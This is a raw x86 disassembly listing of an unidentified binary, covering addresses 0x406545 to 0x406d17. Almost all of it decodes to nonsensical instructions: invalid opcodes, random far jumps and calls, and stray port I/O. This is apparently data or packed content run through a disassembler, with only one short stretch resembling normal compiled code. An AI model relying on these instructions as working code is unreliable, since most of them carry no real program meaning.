  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x55aaed9e],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	cwde   
  406557:	idiv   ebp
  406559:	daa    
  40655a:	scas   al,BYTE PTR es:[edi]
  40655b:	loopne 0x406509
  40655d:	xor    eax,0xe66e8419
  406562:	mov    esp,0x442bfee1
  406567:	adc    DWORD PTR [ebp+0x4fad0e37],edx
  40656d:	xor    BYTE PTR [eax+0xdb899dc],ch
  406573:	sub    DWORD PTR [edi],ecx
  406575:	dec    ebx
  406576:	pop    ss
  406577:	push   cs
  406578:	mov    bl,0xe
  40657a:	fcmovnbe st,st(6)
  40657c:	xchg   edi,edx
  40657e:	pop    ss
  40657f:	pusha  
  406580:	rcl    ah,1
  406582:	cmp    dl,0x73
  406585:	mov    esi,0x11a531ca
  40658a:	pushf  
  40658b:	xchg   ebx,eax
  40658c:	add    al,0xa3
  40658e:	fs xchg ebp,eax
  406590:	out    dx,eax
  406591:	cmp    eax,0x34884880
  406596:	lods   eax,DWORD PTR ds:[esi]
  406597:	(bad)  
  406598:	js     0x40653f
  40659a:	scas   eax,DWORD PTR es:[edi]
  40659b:	inc    esp
  40659c:	pop    esp
  40659d:	iret   
  40659e:	push   ebx
  40659f:	mov    eax,0xb943b74e
  4065a4:	ss mov ah,0xdb
  4065a7:	mov    al,fs:0xccf1946c
  4065ad:	cmp    bl,0xcc
  4065b0:	dec    eax
  4065b1:	int3   
  4065b2:	and    al,0x24
  4065b4:	pop    ebx
  4065b5:	inc    eax
  4065b6:	cmp    DWORD PTR [eax+eax*2-0x91b1221],eax
  4065bd:	ret    
  4065be:	or     eax,0x504706ac
  4065c3:	daa    
  4065c4:	push   0xa95103c
  4065c9:	adc    dl,bl
  4065cb:	in     al,0xef
  4065cd:	push   ebp
  4065ce:	dec    edi
  4065cf:	push   esi
  4065d0:	xchg   BYTE PTR [ecx+0x626b691],cl
  4065d6:	inc    edi
  4065d7:	mov    bh,BYTE PTR [edi]
  4065d9:	ret    
  4065da:	inc    esi
  4065db:	repnz adc eax,0xf077713b
  4065e1:	cmp    eax,0xc45a88a5
  4065e6:	inc    ecx
  4065e7:	mov    esi,0x94b51135
  4065ec:	push   ss
  4065ed:	mov    ch,BYTE PTR [esi-0x3b]
  4065f0:	data16 fsub QWORD PTR [edx+0x10398cd]
  4065f7:	cli    
  4065f8:	mov    edi,0xc6fd5c0e
  4065fd:	into   
  4065fe:	(bad)  
  4065ff:	cmp    ecx,DWORD PTR [ecx+0x7e]
  406602:	jp     0x4065c1
  406604:	nop
  406605:	sbb    eax,0x66ffdf3c
  40660a:	int3   
  40660b:	jg     0x406624
  40660d:	ret    
  40660e:	adc    BYTE PTR [edi-0x2ea1a13c],bl
  406614:	xchg   DWORD PTR [esi+0x27c586fa],ebx
  40661a:	add    ebp,ebx
  40661c:	retf   0xc2a5
  40661f:	mov    esp,0x2087a769
  406624:	pop    edi
  406625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406626:	cs or  al,0x98
  406629:	and    ecx,DWORD PTR [edx+esi*2-0x311fe0e2]
  406630:	in     eax,dx
  406631:	push   esi
  406632:	mov    DWORD PTR [edx+0x36],edx
  406635:	mov    edi,0xd582cf41
  40663a:	outs   dx,BYTE PTR ds:[esi]
  40663b:	push   0x4
  40663d:	shl    DWORD PTR [ecx+edi*2+0x195c57ba],0x5c
  406645:	mov    ebx,0xf785b4c4
  40664a:	retf   
  40664b:	in     eax,0xba
  40664d:	fisubr WORD PTR [ebx-0xc600f2]
  406653:	mov    eax,ds:0x64477271
  406658:	xchg   esi,eax
  406659:	mov    DWORD PTR [edx+0x30],eax
  40665c:	jl     0x40664a
  40665e:	sahf   
  40665f:	sub    al,0xb9
  406661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406662:	(bad)  
  406663:	arpl   WORD PTR [edi+0x4e],ax
  406666:	cmp    eax,0xeaddd9
  40666b:	(bad)  
  40666c:	cmp    esp,DWORD PTR [esi]
  40666e:	cmp    DWORD PTR [edx+0x38],ecx
  406671:	scas   al,BYTE PTR es:[edi]
  406672:	out    0xd3,eax
  406674:	dec    esp
  406675:	fnsave [eax-0x22376c6a]
  40667b:	jmp    0x7f0d2d93
  406680:	retf   
  406681:	jl     0x40662e
  406683:	adc    edx,DWORD PTR [esi-0x4c]
  406686:	sub    eax,0xff633649
  40668b:	ret    0x59be
  40668e:	test   eax,0x2d3cd1fc
  406693:	jle    0x40669e
  406695:	mov    ah,0xf3
  406697:	sbb    edi,ebx
  406699:	jbe    0x40669f
  40669b:	les    esp,FWORD PTR [edx]
  40669d:	jmp    0xc46a5f6f
  4066a2:	xor    ebx,DWORD PTR [ecx]
  4066a4:	retf   0x6ea5
  4066a7:	xchg   esp,eax
  4066a8:	adc    al,0xf7
  4066aa:	jle    0x406729
  4066ac:	push   eax
  4066ad:	sbb    BYTE PTR [ebp+eiz*8+0x4],dh
  4066b1:	push   ss
  4066b2:	test   edx,edi
  4066b4:	push   edi
  4066b5:	mov    edx,0xa2c59dfd
  4066ba:	addr16 mov dl,0x15
  4066bd:	xor    BYTE PTR [eax-0x7367a5f5],dh
  4066c3:	ja     0x406725
  4066c5:	xor    bl,0xef
  4066c8:	dec    ebx
  4066c9:	je     0x4066cc
  4066cb:	fs jo  0x406736
  4066ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066cf:	adc    BYTE PTR [eax+0x33],cl
  4066d2:	push   ss
  4066d3:	pop    esp
  4066d4:	inc    esi
  4066d5:	lods   eax,DWORD PTR ds:[esi]
  4066d6:	nop
  4066d7:	sub    eax,0xef049682
  4066dc:	xor    al,0x9a
  4066de:	test   eax,0x262eb6d5
  4066e3:	mov    bh,0x5b
  4066e5:	or     eax,0x37536d41
  4066ea:	mov    bh,0xf5
  4066ec:	add    eax,DWORD PTR [edx]
  4066ee:	xchg   esp,eax
  4066ef:	pusha  
  4066f0:	and    ch,BYTE PTR [ebp-0x51]
  4066f3:	outs   dx,BYTE PTR ds:[esi]
  4066f4:	push   esp
  4066f5:	ins    DWORD PTR es:[edi],dx
  4066f6:	cmp    ebx,ebx
  4066f8:	call   0x78c0:0x33657332
  4066ff:	sbb    al,0xd1
  406701:	adc    ah,dh
  406703:	test   al,0x25
  406705:	imul   eax,DWORD PTR [esi],0x39
  406708:	mov    ebx,0xbeaf069b
  40670d:	pop    ebp
  40670e:	xchg   edx,eax
  40670f:	fidivr WORD PTR [edi]
  406711:	stos   BYTE PTR es:[edi],al
  406712:	pop    eax
  406713:	jns    0x406783
  406715:	fadd   QWORD PTR [esi+0xe56785c]
  40671b:	cld    
  40671c:	push   ss
  40671d:	jge    0x40671d
  40671f:	and    dl,bl
  406721:	ds and al,0x30
  406724:	pop    ss
  406725:	pop    edx
  406726:	inc    esi
  406727:	sub    eax,0x2857b141
  40672c:	and    DWORD PTR [eax+0x51],edi
  40672f:	(bad)  
  406730:	bound  ebp,QWORD PTR [ebx+0x6fdbd95c]
  406736:	loope  0x4066e8
  406738:	ja     0x4066f5
  40673a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40673b:	add    DWORD PTR [esi],edi
  40673d:	retf   0x603a
  406740:	scas   al,BYTE PTR es:[edi]
  406741:	push   ss
  406742:	xlat   BYTE PTR ds:[ebx]
  406743:	jno    0x4066e2
  406745:	scas   al,BYTE PTR es:[edi]
  406746:	(bad)  
  406747:	xor    BYTE PTR [esi-0x7e59a220],bh
  40674d:	sbb    esp,esp
  40674f:	enter  0x3e7c,0x68
  406753:	icebp  
  406754:	jns    0x40671e
  406756:	fnstsw WORD PTR [edx-0x39]
  406759:	sub    DWORD PTR [ebx+0xe],ecx
  40675c:	test   BYTE PTR [edx+ebp*8+0x1d],0x82
  406761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406762:	dec    ecx
  406763:	leave  
  406764:	mov    edi,0x6c772049
  406769:	cld    
  40676a:	sub    eax,0x26812348
  40676f:	adc    DWORD PTR [edx-0x3db46d01],ebx
  406775:	pop    ecx
  406776:	popa   
  406777:	enter  0x3167,0x61
  40677b:	(bad)  
  40677c:	push   cs
  40677d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40677e:	xchg   ebp,eax
  40677f:	mov    ds:0x3f41f6c1,eax
  406784:	lahf   
  406785:	stos   DWORD PTR es:[edi],eax
  406786:	das    
  406787:	fmul   QWORD PTR [eax]
  406789:	xchg   esp,eax
  40678a:	gs out 0x1,al
  40678d:	mov    edx,0xc883bc28
  406792:	sub    BYTE PTR [edx],ah
  406794:	sar    BYTE PTR [edi+0x62c2c93c],1
  40679a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40679b:	mov    ah,0xb5
  40679d:	aad    0x60
  40679f:	xor    edi,eax
  4067a1:	pop    es
  4067a2:	jne    0x406794
  4067a4:	arpl   WORD PTR [ecx],cx
  4067a6:	repnz loope 0x4067f8
  4067a9:	fiadd  DWORD PTR [edi-0x69]
  4067ac:	adc    ah,0xe1
  4067af:	adc    esp,DWORD PTR [eax-0x50]
  4067b2:	mov    cl,0x4c
  4067b4:	cwde   
  4067b5:	gs call 0xa799:0x72de3cbc
  4067bd:	sub    eax,0x53138f9b
  4067c2:	cmp    edx,DWORD PTR [ecx]
  4067c4:	retf   
  4067c5:	aam    0xad
  4067c7:	(bad)
  4067ca:	add    ebp,ecx
  4067cc:	push   ecx
  4067cd:	outs   dx,DWORD PTR ds:[esi]
  4067ce:	dec    ecx
  4067cf:	push   ebp
  4067d0:	pop    ss
  4067d1:	test   BYTE PTR [ebp-0x7aeded42],0x3e
  4067d8:	sub    ecx,DWORD PTR [ebx]
  4067da:	xchg   ecx,eax
  4067db:	out    dx,eax
  4067dc:	ficomp WORD PTR [esi]
  4067de:	leave  
  4067df:	sbb    al,0x17
  4067e1:	mov    ds:0x6e9c8c5e,al
  4067e6:	and    DWORD PTR [esi+0x62701fca],0x44a56
  4067f0:	push   es
  4067f1:	ret    0xa028
  4067f4:	loopne 0x4067f1
  4067f6:	mov    ecx,0x315283bd
  4067fb:	mov    ebp,DWORD PTR [edi+0x5094ffe6]
  406801:	and    al,0x6d
  406803:	pushf  
  406804:	mov    cl,0x3
  406806:	xor    al,0x58
  406808:	ss stos BYTE PTR es:[edi],al
  40680a:	fstp   DWORD PTR ds:0x5f567be1
  406810:	fcom   QWORD PTR [ebx+0x7b]
  406813:	out    0x60,al
  406815:	ficomp DWORD PTR [edi]
  406817:	mov    eax,ds:0x2a3d77e7
  40681c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40681d:	lods   eax,DWORD PTR ds:[esi]
  40681e:	xor    bl,ah
  406820:	jmp    0xc183:0x2c7322c2
  406827:	gs sti 
  406829:	or     BYTE PTR [edi],bl
  40682b:	call   0xfbfee43b
  406830:	add    DWORD PTR [esi-0x3588f34d],0xfca097a6
  40683a:	jl     0x4068b4
  40683c:	shl    DWORD PTR [esi],0xf5
  40683f:	mov    ch,0x73
  406841:	call   DWORD PTR [ebp-0x63]
  406844:	scas   eax,DWORD PTR es:[edi]
  406845:	adc    ecx,DWORD PTR [ecx]
  406847:	scas   al,BYTE PTR es:[edi]
  406848:	push   0x4f
  40684a:	shl    DWORD PTR [edx+eiz*8-0x7b],0x21
  40684f:	fmulp  st(5),st
  406851:	xchg   esp,eax
  406852:	mov    al,0xaa
  406854:	mov    dl,0x54
  406856:	fist   WORD PTR [esi-0x5be8f94d]
  40685c:	mov    DWORD PTR [ecx-0x9973364],0x4999a006
  406866:	xchg   DWORD PTR [edi-0x30396824],eax
  40686c:	dec    edi
  40686d:	cld    
  40686e:	and    eax,0x7c8daa78
  406873:	clc    
  406874:	fnstcw WORD PTR [esi]
  406876:	out    0x1b,al
  406878:	out    dx,al
  406879:	mov    ?,ebx
  40687b:	jge    0x4068b0
  40687d:	or     edx,0xfbec10f5
  406883:	sub    bh,BYTE PTR [ebx]
  406885:	push   ecx
  406886:	les    ecx,FWORD PTR [eax+0x3c8ce7d1]
  40688c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40688d:	cld    
  40688e:	stc    
  40688f:	call   0x917a:0x5bdca770
  406896:	push   0xffffffde
  406898:	mov    esp,0xd310f381
  40689d:	push   eax
  40689e:	out    dx,eax
  40689f:	cli    
  4068a0:	(bad)  
  4068a1:	sbb    esp,DWORD PTR ds:0x10a9f6d8
  4068a7:	push   ebx
  4068a8:	xchg   esi,eax
  4068a9:	es dec ebp
  4068ab:	xchg   esp,eax
  4068ac:	hlt    
  4068ad:	jge    0x406879
  4068af:	mov    dl,0x3a
  4068b1:	add    ebx,edi
  4068b3:	dec    esi
  4068b4:	mov    cl,0x86
  4068b6:	addr16 jno 0x4068c0
  4068b9:	adc    BYTE PTR [edi],dl
  4068bb:	ficom  DWORD PTR ds:0x7ddc222c
  4068c1:	shr    DWORD PTR [ebx+0x28],0xdb
  4068c5:	out    0xe8,al
  4068c7:	and    BYTE PTR [edx+0x1b],ah
  4068ca:	imul   edx,DWORD PTR [eiz*8-0x26ac9860],0xffffff85
  4068d2:	adc    al,0x23
  4068d4:	xchg   DWORD PTR [edx-0x4c],edi
  4068d7:	mov    dl,0x4f
  4068d9:	pop    edi
  4068da:	call   0xe0b2:0x1edd2520
  4068e1:	rol    DWORD PTR [eax+0x339a03f2],1
  4068e7:	scas   eax,DWORD PTR es:[edi]
  4068e8:	fs out 0x1,al
  4068eb:	fst    QWORD PTR [eax]
  4068ed:	add    cl,BYTE PTR [ebp-0x64]
  4068f0:	adc    ah,BYTE PTR [esi]
  4068f2:	clc    
  4068f3:	add    BYTE PTR es:[ebp+0x79],dl
  4068f7:	jo     0x406975
  4068f9:	rol    BYTE PTR [ebx+0x30],cl
  4068fc:	cmc    
  4068fd:	pop    edi
  4068fe:	es jae 0x4068b3
  406901:	clc    
  406902:	test   eax,0x87c694e2
  406907:	inc    ebp
  406908:	sub    edx,DWORD PTR [ecx+0x6f]
  40690b:	test   BYTE PTR [eax*8+0x6b352cf9],dh
  406912:	sbb    esi,DWORD PTR [ecx-0x3e18f5b2]
  406918:	loope  0x406938
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0x7061e1de
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	inc    ax
  406982:	sub    eax,0x82a5172e
  406987:	stos   DWORD PTR es:[edi],eax
  406988:	jno    0x406977
  40698a:	adc    al,dl
  40698c:	fist   WORD PTR [eax+0x195af90]
  406992:	cmp    DWORD PTR [ecx],ecx
  406994:	ins    BYTE PTR es:[edi],dx
  406995:	pop    eax
  406996:	mov    ebx,0x45f5c24e
  40699b:	dec    ebx
  40699c:	outs   dx,DWORD PTR ds:[esi]
  40699d:	nop
  40699e:	lahf   
  40699f:	add    al,0x18
  4069a1:	push   ebp
  4069a2:	jne    0x406978
  4069a4:	stos   DWORD PTR es:[edi],eax
  4069a5:	repnz (bad) 
  4069a7:	aaa    
  4069a8:	test   dh,ah
  4069aa:	mov    ?,ebx
  4069ac:	call   0x462:0xb662292b
  4069b3:	xlat   BYTE PTR ds:[ebx]
  4069b4:	mov    ds:0x171a1ed0,al
  4069b9:	int3   
  4069ba:	pop    DWORD PTR [ecx-0x3e]
  4069bd:	xor    ebp,DWORD PTR [edi]
  4069bf:	mov    ebx,0xd2c844c6
  4069c4:	js     0x406950
  4069c6:	cmp    BYTE PTR [edx+ebx*8],dh
  4069c9:	mov    WORD PTR [ecx],ss
  4069cb:	cld    
  4069cc:	cmp    DWORD PTR [ecx],esp
  4069ce:	jo     0x406950
  4069d0:	push   ss
  4069d1:	scas   eax,DWORD PTR es:[di]
  4069d3:	mov    esp,0x8e8fc7cf
  4069d8:	cmp    edi,esp
  4069da:	fdiv   st(0),st
  4069dc:	out    0xa,al
  4069de:	sti    
  4069df:	out    0x2c,al
  4069e1:	fisttp WORD PTR [ecx]
  4069e3:	sub    eax,0xfa986443
  4069e8:	jl     0x406993
  4069ea:	outs   dx,DWORD PTR ds:[esi]
  4069eb:	ja     0x406a0a
  4069ed:	add    eax,0x528deb87
  4069f2:	mov    edx,0x4009d145
  4069f7:	sub    DWORD PTR [ecx],edi
  4069f9:	jne    0x406a19
  4069fb:	shl    BYTE PTR [ebx-0x7600fc8d],0x2d
  406a02:	shl    BYTE PTR [ebx+edx*1+0x4d],0x9e
  406a07:	mov    eax,0xa89d4d38
  406a0c:	in     eax,dx
  406a0d:	xchg   edx,eax
  406a0e:	xchg   ecx,eax
  406a0f:	loope  0x406994
  406a11:	ret    
  406a12:	pop    ebx
  406a13:	stc    
  406a14:	xchg   esp,eax
  406a15:	ins    DWORD PTR es:[edi],dx
  406a16:	hlt    
  406a17:	pop    ds
  406a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a19:	pop    ecx
  406a1a:	pushw  0x6afa
  406a1e:	sub    esi,DWORD PTR [ebp-0x6f]
  406a21:	mov    al,0xa5
  406a23:	cld    
  406a24:	xchg   DWORD PTR [ecx-0x17],ecx
  406a27:	adc    DWORD PTR [edi+0x341ce6a4],esi
  406a2d:	sub    eax,0x9e99706e
  406a32:	mov    ds:0x712e64b,al
  406a37:	in     eax,0x8c
  406a39:	fcomp  QWORD PTR [edi+0x7e17c2c7]
  406a3f:	jnp    0x406a46
  406a41:	push   edi
  406a42:	add    BYTE PTR [edx+0x2b],bh
  406a45:	loop   0x406aa9
  406a47:	mov    eax,ds:0xccb254b7
  406a4c:	push   edi
  406a4d:	pop    esi
  406a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a4f:	jg     0x4069e1
  406a51:	sub    ecx,DWORD PTR [ebp+0x32]
  406a54:	adc    ecx,ecx
  406a56:	sahf   
  406a57:	jnp    0x406ab0
  406a59:	pop    ebp
  406a5a:	push   cs
  406a5b:	fs jae 0x406ac1
  406a5e:	jmp    0x623b:0x972acde6
  406a65:	jbe    0x406aa7
  406a67:	jmp    0x6830:0x6c84141a
  406a6e:	js     0x406a0f
  406a70:	mov    esi,0xfbbbd697
  406a75:	sahf   
  406a76:	cwde   
  406a77:	loop   0x406a49
  406a79:	jg     0x406a72
  406a7b:	(bad)  
  406a7c:	shl    BYTE PTR [ecx+0x390afb84],1
  406a82:	out    0x9e,al
  406a84:	(bad)  gs:[bp+si+0x50a5]
  406a8a:	nop
  406a8b:	pusha  
  406a8c:	cmp    edx,ebx
  406a8e:	xchg   BYTE PTR ds:0x7648efc4,bl
  406a94:	aad    0xb1
  406a96:	bound  ebx,QWORD PTR [eax+eax*4]
  406a99:	lds    esp,FWORD PTR [edi+0xeea650c]
  406a9f:	int3   
  406aa0:	lods   eax,DWORD PTR ds:[esi]
  406aa1:	push   ds
  406aa2:	cmp    ch,dl
  406aa4:	inc    eax
  406aa5:	fwait
  406aa6:	ins    BYTE PTR es:[edi],dx
  406aa7:	(bad)  
  406aa8:	lahf   
  406aa9:	lahf   
  406aaa:	aad    0x51
  406aac:	ins    DWORD PTR es:[edi],dx
  406aad:	add    eax,0x797d807d
  406ab2:	mov    DWORD PTR [edi+edx*2+0x18],0xb255756b
  406aba:	add    al,0x4b
  406abc:	popf   
  406abd:	ins    DWORD PTR es:[edi],dx
  406abe:	int    0x97
  406ac0:	sub    eax,0x94e0418a
  406ac5:	xchg   esp,eax
  406ac6:	aad    0x89
  406ac8:	push   ds
  406ac9:	rcl    DWORD PTR fs:[edx+0x32],cl
  406acd:	sbb    ah,0xbe
  406ad0:	xchg   DWORD PTR [edi],esp
  406ad2:	xor    ebp,eax
  406ad4:	jae    0x406b1d
  406ad6:	sub    eax,0x9d47d459
  406adb:	rol    BYTE PTR [ecx],1
  406add:	cs retf 0xbc5e
  406ae1:	test   al,0xf4
  406ae3:	push   ds
  406ae4:	jmp    0xc6a0:0xc14f28d4
  406aeb:	mov    ds:0x3a2e1b43,eax
  406af0:	not    BYTE PTR [edi+0x4d895d17]
  406af6:	dec    ecx
  406af7:	rcl    BYTE PTR [eax+0x8],1
  406afa:	jae    0x406b35
  406afc:	loope  0x406b61
  406afe:	mov    ah,0x6
  406b00:	ds push eax
  406b02:	lds    edx,FWORD PTR [ecx+0x62e20394]
  406b08:	ins    DWORD PTR es:[edi],dx
  406b09:	sub    bh,ah
  406b0b:	mov    es,WORD PTR [ecx-0x73]
  406b0e:	retf   
  406b0f:	jnp    0x406ae3
  406b11:	in     al,0xad
  406b13:	xchg   esi,eax
  406b14:	xchg   edx,eax
  406b15:	sub    ah,BYTE PTR [edx-0xef8a661]
  406b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b1c:	sub    ecx,DWORD PTR [ebp+edx*8+0x1956e3e1]
  406b23:	rcr    BYTE PTR [ebp-0x61],0x7a
  406b27:	rcl    BYTE PTR [ecx-0x5f],0x43
  406b2b:	call   0x78af:0x864acb0c
  406b32:	test   al,0x40
  406b34:	and    BYTE PTR [eax],bh
  406b36:	test   DWORD PTR [ecx+0x68],0x356879d7
  406b3d:	jns    0x406b2b
  406b3f:	xor    esi,ebx
  406b41:	or     eax,0xc560ca57
  406b46:	inc    ebp
  406b47:	adc    BYTE PTR [ebx+0x79],dh
  406b4a:	cmc    
  406b4b:	es out 0x50,eax
  406b4e:	xor    edi,DWORD PTR [edi]
  406b50:	and    BYTE PTR [ebp+0x2b],bl
  406b53:	push   es
  406b54:	mov    cl,0x19
  406b56:	add    ah,BYTE PTR [edx]
  406b58:	mov    ebp,0xb44706af
  406b5d:	xchg   ecx,eax
  406b5e:	jmp    0x5f9:0x1913871e
  406b65:	int    0x9e
  406b67:	std    
  406b68:	es jbe 0x406bc4
  406b6b:	aad    0xab
  406b6d:	lods   al,BYTE PTR ds:[esi]
  406b6e:	mov    ds:0xfba37732,al
  406b73:	repnz lock test al,0x86
  406b77:	push   ebp
  406b78:	je     0x406be6
  406b7a:	mov    esi,0x1961b831
  406b7f:	sub    eax,DWORD PTR [ebx+0xb957bc5]
  406b85:	push   ds
  406b86:	xchg   esp,eax
  406b87:	add    BYTE PTR [esi+0x6],ah
  406b8a:	inc    edi
  406b8b:	int    0x86
  406b8d:	dec    eax
  406b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b8f:	lods   al,BYTE PTR ds:[esi]
  406b90:	jl     0x406bf8
  406b92:	repnz jmp 0xb2a2:0x60e312ab
  406b9a:	cdq    
  406b9b:	jecxz  0x406b64
  406b9d:	xchg   esi,eax
  406b9e:	fisttp WORD PTR [edx+0x176c5c90]
  406ba4:	xchg   esi,eax
  406ba5:	sub    BYTE PTR ds:0x353df1f6,ah
  406bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bac:	mov    al,0x84
  406bae:	sub    eax,0xbe064c06
  406bb3:	dec    ebp
  406bb4:	and    ah,dl
  406bb6:	xor    al,0x1c
  406bb8:	aad    0xbe
  406bba:	xchg   edx,eax
  406bbb:	adc    esp,ebp
  406bbd:	aam    0x6c
  406bbf:	popf   
  406bc0:	fwait
  406bc1:	jp     0x406ba5
  406bc3:	test   DWORD PTR [esi],esp
  406bc5:	adc    ebx,esp
  406bc7:	fwait
  406bc8:	push   edx
  406bc9:	arpl   WORD PTR [esp+ebx*4-0xe],bp
  406bcd:	push   0xa
  406bcf:	push   ebp
  406bd0:	inc    ebx
  406bd1:	gs jle 0x406c0c
  406bd4:	add    ebp,edx
  406bd6:	ja     0x406bc3
  406bd8:	aas    
  406bd9:	xchg   ebx,eax
  406bda:	outs   dx,DWORD PTR ds:[esi]
  406bdb:	fcomp  QWORD PTR [ebx+ebx*2+0x3d]
  406bdf:	mov    db2,eax
  406be2:	mov    eax,0x5bbf6b60
  406be7:	ret    0x5342
  406bea:	push   ebx
  406beb:	cmp    DWORD PTR [esp+edx*8+0x62],edi
  406bef:	ds cwde 
  406bf1:	jbe    0x406b91
  406bf3:	inc    ecx
  406bf4:	es jmp 0x3d43614a
  406bfa:	rcr    BYTE PTR [ebx+eiz*2-0xf],0x75
  406bff:	(bad)  
  406c00:	sbb    al,0xd5
  406c02:	sbb    BYTE PTR [ebx],ah
  406c04:	mov    al,ds:0x78906c9b
  406c09:	push   0xffffffe5
  406c0b:	pusha  
  406c0c:	loopne 0x406bec
  406c0e:	cmp    al,0xbc
  406c10:	clc    
  406c11:	or     ebx,edx
  406c13:	mov    bh,0x89
  406c15:	ret    
  406c16:	mov    cl,0xc1
  406c18:	push   edi
  406c19:	mov    dl,0x24
  406c1b:	lea    esp,[edi+esi*4+0xf3dcd0b]
  406c22:	ds or  esi,0xc75c281e
  406c29:	push   esp
  406c2a:	clc    
  406c2b:	adc    BYTE PTR [ebx-0x3fef6a56],al
  406c31:	dec    edx
  406c32:	stc    
  406c33:	ret    
  406c34:	nop
  406c35:	jmp    FWORD PTR [eax+0x3689a77b]
  406c3b:	lods   eax,DWORD PTR ds:[esi]
  406c3c:	dec    esp
  406c3d:	aas    
  406c3e:	xor    bh,BYTE PTR [ebp+0x3ea60d8c]
  406c44:	xchg   bh,bl
  406c46:	push   ds
  406c47:	pushf  
  406c48:	xchg   edx,eax
  406c49:	xor    al,0xb9
  406c4b:	hlt    
  406c4c:	fcom   DWORD PTR [edx-0x58]
  406c4f:	test   al,0x7b
  406c51:	icebp  
  406c52:	push   edx
  406c53:	mov    ds:0xf4e22ffb,al
  406c58:	lods   al,BYTE PTR ds:[esi]
  406c59:	hlt    
  406c5a:	aam    0x25
  406c5c:	or     al,0x3a
  406c5e:	enter  0x8281,0x3a
  406c62:	add    al,0x53
  406c64:	sub    eax,0x29c4bb78
  406c69:	pop    esp
  406c6a:	dec    DWORD PTR [ecx]
  406c6c:	cwde   
  406c6d:	into   
  406c6e:	clc    
  406c6f:	push   esp
  406c70:	aas    
  406c71:	mov    WORD PTR [edi-0x69],ss
  406c74:	mov    esi,0xcf20e20b
  406c79:	push   ebp
  406c7a:	mov    ds:0xa7f9df34,al
  406c7f:	hlt    
  406c80:	jnp    0x406ce3
  406c82:	adc    eax,0x2a5766e3
  406c87:	xlat   BYTE PTR ds:[ebx]
  406c88:	std    
  406c89:	adc    esp,DWORD PTR [eax+ebx*8+0x5950ee5a]
  406c90:	inc    BYTE PTR [eax-0x56]
  406c93:	clc    
  406c94:	fidivr WORD PTR ds:0x8cd9b491
  406c9a:	fwait
  406c9b:	add    esp,DWORD PTR [esi]
  406c9d:	fwait
  406c9e:	jecxz  0x406d1a
  406ca0:	je     0x406d16
  406ca2:	hlt    
  406ca3:	int    0xcf
  406ca5:	xchg   esi,esi
  406ca7:	ror    eax,cl
  406ca9:	dec    ebp
  406caa:	cmp    al,0xff
  406cac:	pop    ebp
  406cad:	fdivr  QWORD PTR [edx+ebx*2-0x3670308d]
  406cb4:	shl    BYTE PTR [eax],0xd7
  406cb7:	mov    WORD PTR [edx-0x6d],fs
  406cba:	push   edi
  406cbb:	sub    BYTE PTR [eax],0x5a
  406cbe:	push   edx
  406cbf:	popa   
  406cc0:	(bad)  
  406cc1:	fst    QWORD PTR [ebp-0x4a79271c]
  406cc7:	shl    DWORD PTR [ecx-0x45],cl
  406cca:	leave  
  406ccb:	push   edx
  406ccc:	mov    eax,ds:0x1e63463a
  406cd1:	mov    ch,0xed
  406cd3:	lods   eax,DWORD PTR ds:[esi]
  406cd4:	add    al,0x61
  406cd6:	push   ss
  406cd7:	mov    bl,0xd3
  406cd9:	mov    ch,BYTE PTR [ebx-0x3e]
  406cdc:	fiadd  DWORD PTR [ecx-0x2d]
  406cdf:	shl    bh,0xd7
  406ce2:	mov    bl,bh
  406ce4:	pop    edi
  406ce5:	xor    eax,0xaec95938
  406cea:	nop
  406ceb:	(bad)  
  406cec:	ja     0x406ce7
  406cee:	mov    bl,0xc9
  406cf0:	adc    ebx,esp
  406cf2:	gs pop eax
  406cf4:	xchg   ebp,eax
  406cf5:	mov    WORD PTR [ebx+0x5459c9e9],?
  406cfb:	std    
  406cfc:	mov    DWORD PTR [ecx+0x5c],edi
  406cff:	and    bl,ch
  406d01:	lea    esp,[ebp-0x22]
  406d04:	jno    0x406d4b
  406d06:	ds and eax,0xa20df5bb
  406d0c:	repz fcom st(3)
  406d0f:	pop    ebp
  406d10:	add    edi,DWORD PTR [edi+0x4d63bb9f]
  406d16:	push   eax
  406d17:	jno    0x406d04
